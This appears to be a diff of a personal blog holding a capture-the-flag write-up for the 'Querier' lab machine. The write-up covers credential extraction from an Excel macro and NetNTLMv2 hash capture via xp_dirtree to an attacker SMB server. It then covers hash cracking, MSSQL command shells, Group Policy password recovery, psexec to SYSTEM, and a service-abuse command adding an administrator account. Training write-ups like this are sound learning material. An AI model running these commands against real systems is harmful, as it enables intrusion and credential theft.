+Aggressive OS guesses: Microsoft Windows Server 2012 (92%), Microsoft Windows Server 2016 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 build 10586 - 14393 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 10 1511 (90%), Microsoft Windows 10 1703 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4s, deviation: 0s, median: 4s
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 
+|_    TCP port: 1433
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-06-21 19:18:34
+|_  start_date: N/A
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT      ADDRESS
+1   64.45 ms 10.10.12.1
+2   64.12 ms QUERIER (10.10.10.125)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.45 seconds</code></pre></div></div>
+
+<h2 id="discovering-shares">Discovering shares</h2>
+
+<p>Let&rsquo;s enum shares:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbmap.py -H 10.10.10.125 
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.125...
+[+] IP: 10.10.10.125:445  Name: QUERIER                                           
+  Disk                                            Permissions
+  ----                                            -----------
+[!] Access Denied</code></pre></div></div></p>
+
+<p>Hmmmm&hellip;. Let&rsquo;s try a dummy username:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbmap.py -H 10.10.10.125 -u &#39;type_whatever_you_want_here&#39;
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.125...
+[+] IP: 10.10.10.125:445  Name: QUERIER                                           
+  Disk                                                Permissions
+  ----                                                -----------
+  ADMIN$                                              NO ACCESS
+  C$                                                  NO ACCESS
+  IPC$                                                READ ONLY
+  Reports                                             READ ONLY</code></pre></div></div></p>
+
+<p>Surprise, surprise. It works (stupid SMB protocol :P). Let&rsquo;s use Impacket&rsquo;s smbclient.py to examine the &lsquo;Reports&rsquo; share:</p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbclient.py -no-pass QUERIER/username_does_not_matter@10.10.10.125
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+Reports
+# use Reports
+# ls
+drw-rw-rw-          0  Tue Jan 29 01:26:31 2019 .
+drw-rw-rw-          0  Tue Jan 29 01:26:31 2019 ..
+-rw-rw-rw-      12229  Tue Jan 29 01:26:31 2019 Currency Volume Report.xlsm
+# get Currency Volume Report.xlsm
+# exit</code></pre></div></div>
+
+<p>We can open this xlsm file using -for example- LibreOffice. If we examine the macros (Tools -&gt; Macros -&gt; Edit Macros) we discover some MSSQL credentials:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">...
+conn.ConnectionString = &#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&#34;
+...</code></pre></div></div></p>
+
+<p>In case you didn&rsquo;t know it, xlsm, xlsx, docx et.c. are just zip archives. Therefore, we can decompress them:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ unzip Currency\ Volume\ Report.xlsm 
+Archive:  Currency Volume Report.xlsm
+  inflating: [Content_Types].xml     
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/vbaProject.bin       
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml
+
+$ strings xl/vbaProject.bin
+...
+Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
+...</code></pre></div></div></p>
+
+<p>Let&rsquo;s try to connect to the MS SQL server using Impacket&rsquo;s msssqlclient.py:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ mssqlclient.py -windows-auth QUERIER/reporting:&#39;PcwTWTHRwryjc$c6&#39;@10.10.10.125
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to &#39;volume&#39;.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL&gt;</code></pre></div></div></p>
+
+<p>Neat! Now, let&rsquo;s try to execute a command using the &lsquo;xp_cmdshell&rsquo; procedure:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">SQL&gt; EXEC xp_cmdshell &#34;whoami&#34;
+[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object &#39;xp_cmdshell&#39;, database &#39;mssqlsystemresource&#39;, schema &#39;sys&#39;.</code></pre></div></div></p>
+
+<p>Hmmm, well that didn&rsquo;t work. Let&rsquo;s try to activate &lsquo;xp_cmdshell&rsquo;:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">SQL&gt; EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec SP_CONFIGURE &#39;xp_cmdshell&#39;,1;RECONFIGURE;
+[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+SQL&gt; </code></pre></div></div></p>
+
+<p>Nope. Apparently the user &lsquo;reporting&rsquo; doesn&rsquo;t have the required privileges/permissions.</p>
+
+<h2 id="capturing-credentials">Capturing credentials</h2>
+
+<p>Well, we can try -using our &lsquo;reporting&rsquo; account- to capture some other credentials&hellip; We will use Impacket&rsquo;s smbserver.py to listen for incoming SMB connections::
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo smbserver.py -smb2support myshare /tmp
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</code></pre></div></div></p>
+
+<p>Now, we can use msdat tool (<a href="https://github.com/quentinhardy/msdat" target="_blank">https://github.com/quentinhardy/msdat</a>) to send some traffic towards our SMB server:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msdat smbauthcapture -v -s 10.10.10.125 -p 1433 -D QUERIER -U reporting -P &#39;PcwTWTHRwryjc$c6&#39; --capture 10.10.15.16
+
+[1] (10.10.10.125:1433): Try to capture a SMB authentication with the xp_dirtree, xp_fileexist or xp_getfiledetails method
+00:51:22 INFO -: Test all methods allowing to capture a SMB authentication...
+00:51:22 INFO -: Capturing SMB Authentication via XP_DIRTREE...
+00:51:23 INFO -: No error during the running: you could capture the SMB authentication
+[+] You can perhaps capture a SMB authentication with these methods. Check your SMB capture tool !</code></pre></div></div></p>
+
+<p>Let&rsquo;s see what we received in our SMB server:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[*] Incoming connection (10.10.10.125,49741)
+[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
+[*] User mssql-svc\QUERIER authenticated successfully
+[*] mssql-svc::QUERIER:4141414141414141:790d1a20ff18cdb330b3b6e43bca6988:010100000000000000e901777b28d50126ad6b81542b18860000000001001000780051004d005a004a006f004f00730002001000780048004f00540045006b006300610003001000780051004d005a004a006f004f00730004001000780048004f00540045006b00630061000700080000e901777b28d50106000400020000000800300030000000000000000000000000300000590946bc19d0765a150c1c561e8ea40b9f0627e137bb3b8950ad8952e5b6f3930a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003600000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[-] SMB2_TREE_CONNECT not found S
+[-] SMB2_TREE_CONNECT not found S
+[*] AUTHENTICATE_MESSAGE (\,QUERIER)
+[*] User \QUERIER authenticated successfully
+[*] :::00::4141414141414141
+[*] Disconnecting Share(1:IPC$)
+[*] Handle: [Errno 104] Connection reset by peer
+[*] Closing down connection (10.10.10.125,49741)
+[*] Remaining connections []</code></pre></div></div></p>
+
+<p>Let&rsquo;s try to crack/reverse this hash using hashcat:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashcat -h  | grep -i NetNTLMv2
+   5600 | NetNTLMv2                                        | Network Protocols
+
+$ hashcat -m 5600 mssql-svc::QUERIER:4141414141414141:790d1a20ff18cdb330b3b6e43bca6988:010100000000000000e901777b28d50126ad6b81542b18860000000001001000780051004d005a004a006f004f00730002001000780048004f00540045006b006300610003001000780051004d005a004a006f004f00730004001000780048004f00540045006b00630061000700080000e901777b28d50106000400020000000800300030000000000000000000000000300000590946bc19d0765a150c1c561e8ea40b9f0627e137bb3b8950ad8952e5b6f3930a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003600000000000000000000000000 /usr/share/dict/rockyou.txt
+
+...
+
+corporate568</code></pre></div></div></p>
+
+<h2 id="getting-mssql-shell-as-mssql-svc">Getting (mssql) shell as mssql-svc</h2>
+
+<p>It&rsquo;s high time to get a shell. We can use a tool I wrote (<a href="https://alamot.github.io/mssql_shell/" target="_blank">https://alamot.github.io/mssql_shell/</a>). First, we have to edit some settings inside the script:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">...
+MSSQL_SERVER=&#34;10.10.10.125&#34;
+MSSQL_USERNAME = &#34;QUERIER\\mssql-svc&#34;
+MSSQL_PASSWORD = &#34;corporate568&#34;
+...</code></pre></div></div></p>
+
+<p>Now, let&rsquo;s run it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python mssql_shell.py 
+Successful login: QUERIER\mssql-svc@10.10.10.125
+Trying to enable xp_cmdshell ...
+CMD mssql-svc@QUERIER C:\Windows\system32&gt; whoami
+querier\mssql-svc
+CMD mssql-svc@QUERIER C:\Windows\system32&gt; type C:\Users\mssql-svc\Desktop\user.txt
+c*****************************6</code></pre></div></div></p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Let&rsquo;s upload PowerUp.ps1 (<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):" target="_blank">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):</a>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Windows\system32&gt; cd C:\Users\Public
+CMD mssql-svc@QUERIER C:\Users\Public&gt; UPLOAD PowerUp.ps1 C:\Users\Public\PowerUp.ps1
+Uploading PowerUp.ps1 to C:\Users\Public\PowerUp.ps1
+Data length (b64-encoded): 732KB
+100%|██████████| 735/735 [00:50&lt;00:00, 16.63KB/s]
+Input Length = 750897
+Output Length = 562841
+CertUtil: -decode command completed successfully.
+MD5 hashes match: 711ca55ca8d9ba4f776ce052417fd98f
+*** UPLOAD PROCEDURE FINISHED *** 
+CMD mssql-svc@QUERIER C:\Users\Public&gt;</code></pre></div></div></p>
+
+<p>Now, let&rsquo;s run PowerUp.ps1:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII powerup_output.txt }&#34;
+CMD mssql-svc@QUERIER C:\Users\Public&gt; type powerup_output.txt
+...
+[*] Checking service permissions...
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name &#39;UsoSvc&#39;
+CanRestart    : True
+...
+[*] Checking %PATH% for potentially hijackable DLL locations...
+ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+IdentityReference : QUERIER\mssql-svc
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&#39;
+...
+[*] Checking for unattended install files...
+UnattendPath : C:\Windows\Panther\Unattend.xml
+...
+[*] Checking for cached Group Policy Preferences .xml files....
+None
+None
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group 
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+...</code></pre></div></div></p>
+
+<h2 id="using-group-policy-password-and-psexec-py">Using Group Policy password and psexec.py</h2>
+
+<p>We can use Impacket&rsquo;s psexec.py to get nt authority/system:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ psexec.py QUERIER/Administrator:&#39;MyUnclesAreMarioAndLuigi!!1!&#39;@10.10.10.125
+
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.125.....
+[*] Found writable share ADMIN$
+[*] Uploading file UNLjBysl.exe
+[*] Opening SVCManager on 10.10.10.125.....
+[*] Creating service bhCD on 10.10.10.125.....
+[*] Starting service bhCD.....
+
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;cd /users/administrator/desktop
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+b******************************2</code></pre></div></div></p>
+
+<p>Hooray! :D</p>
+
+<h2 id="ab-using-usosvc-service">(Ab)Using UsoSvc service</h2>
+
+<p>Let&rsquo;s examine the &ldquo;UsoSvc&rdquo; service:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; sc qc &#34;UsoSvc&#34;
+[SC] QueryServiceConfig SUCCESS
+None
+SERVICE_NAME: UsoSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem</code></pre></div></div></p>
+
+<p>Let&rsquo;s exploit it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc | Out-File -Encoding ASCII output.txt }&#34;
+CMD mssql-svc@QUERIER C:\Users\Public&gt; type output.txt
+
+ServiceAbused Command                                                                   
+------------- -------                                                                   
+UsoSvc        net user john Password123! /add &amp;&amp; net localgroup Administrators john /add
+
+CMD mssql-svc@QUERIER C:\Users\Public&gt; net user
+User accounts for \\QUERIER
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+john                     mssql-svc                reporting                
+WDAGUtilityAccount       
+The command completed successfully.</code></pre></div></div></p>
+
+<p>Let&rsquo;s exploit it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; powershell -command &#34;&amp; { . .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc | Out-File -Encoding ASCII output.txt }&#34;
+CMD mssql-svc@QUERIER C:\Users\Public&gt; type output.txt
+
+ServiceAbused Command                                                                   
+------------- -------                                                                   
+UsoSvc        net user john Password123! /add &amp;&amp; net localgroup Administrators john /add</code></pre></div></div></p>
+
+<p>Let&rsquo;s see if our exploitation was successful:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">CMD mssql-svc@QUERIER C:\Users\Public&gt; net user
+User accounts for \\QUERIER
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+john                     mssql-svc                reporting                
+WDAGUtilityAccount       
+The command completed successfully.</code></pre></div></div>
+We could do also things like that et.c.:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sc config UsoSvc binPath=&#34;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&#34;</code></pre></div></div></p>
+
+<p>That&rsquo;s all folks! :)</p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fmssql_shell%2f&t=MSSQL%20shell%20with%20file%20upload%20capability" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmssql_shell%2f&text=MSSQL%20shell%20with%20file%20upload%20capability&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmssql_shell%2f&text=MSSQL%20%ce%ba%ce%ad%ce%bb%cf%85%cf%86%ce%bf%cf%82%20%ce%bc%ce%b5%20%ce%b4%cf%85%ce%bd%ce%b1%cf%84%cf%8c%cf%84%ce%b7%cf%84%ce%b1%20%ce%b1%ce%bd%ce%b5%ce%b2%ce%ac%cf%83%ce%bc%ce%b1%cf%84%ce%bf%cf%82%20%ce%b1%cf%81%cf%87%ce%b5%ce%af%cf%89%ce%bd&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmssql_shell%2f&description=MSSQL%20shell%20with%20file%20upload%20capability&media=https://alamot.github.io/images/dbs.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmssql_shell%2f&description=MSSQL%20%ce%ba%ce%ad%ce%bb%cf%85%cf%86%ce%bf%cf%82%20%ce%bc%ce%b5%20%ce%b4%cf%85%ce%bd%ce%b1%cf%84%cf%8c%cf%84%ce%b7%cf%84%ce%b1%20%ce%b1%ce%bd%ce%b5%ce%b2%ce%ac%cf%83%ce%bc%ce%b1%cf%84%ce%bf%cf%82%20%ce%b1%cf%81%cf%87%ce%b5%ce%af%cf%89%ce%bd&media=https://alamot.github.io/images/dbs.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fquerier_writeup%2f&t=Querier%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fquerier_writeup%2f&text=Querier%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fquerier_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Querier&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fquerier_writeup%2f&description=Querier%20write-up&media=https://alamot.github.io/images/querier.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fquerier_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Querier&media=https://alamot.github.io/images/querier.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -437,883 +713,6 @@ if (language) {
            
            
           
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/test_encodings/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/encodings.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to determine the character encoding of a text file</h3>
-      <h3 class="title" lang="el">Πως να αναγνωρίσετε την κωδικοποίηση χαρακτήρων ενός αρχείου κειμένου</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Oct 2016</time>
-      <time lang="el">21 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
